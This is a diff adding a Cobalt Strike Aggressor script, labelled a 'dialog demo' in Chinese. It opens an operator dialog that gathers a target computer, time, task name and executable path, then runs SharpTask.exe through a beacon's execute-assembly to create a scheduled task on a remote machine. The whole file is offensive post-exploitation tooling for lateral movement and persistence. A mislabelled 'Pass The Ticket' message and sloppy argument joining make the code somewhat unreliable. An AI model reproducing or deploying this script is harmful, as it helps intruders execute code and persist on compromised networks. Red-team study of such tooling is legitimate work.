@@ -1,0 +1,40 @@
+# 提示框demo
+sub sharptask{
+ # beacon ID
+    $bid = $1;
+ # command arugement variable  
+    $cmdargs = "";
+ # Pop Dialog Box and control flow
+    $dialog = dialog("提示框头部", %(execmethod => "Execute-Assembly"), lambda({
+ 
+ # manipulate the first argument depending on the executables command line switch statements
+ # manipulate the second argument depending on the expected input format  
+        foreach $key => $value ($3){
+            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
+                $cmdargs .= $key;
+                $cmdargs .= ' ';
+                $cmdargs .= $value.' ';
+                $cmdargs .= ' ';
+            }
+
+        }
+ # btask just displays message in beacon window
+ # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
+       if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing Pass The Ticket via Execute-Assembly');
+            bexecute_assembly($bid, script_resource('/exe/SharpTask.exe'), '--AddTask'.$cmdargs.''."");
+        }
+      
+    }));
+    
+ # Dialog box contents and text boxes mapped to command line argument keys   
+    dialog_description($dialog, "Enter The Following Information To Create A Scheduled Task On A Remote Machine:");
+    drow_text($dialog, "",  "Computer");
+    drow_text($dialog, "",  "Time");
+    drow_text($dialog, "",  "Folder");
+    drow_text($dialog, "",  "Task Name");
+    drow_text($dialog, "",  "Task Description");
+    drow_text($dialog, "",  "Path To Executable");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
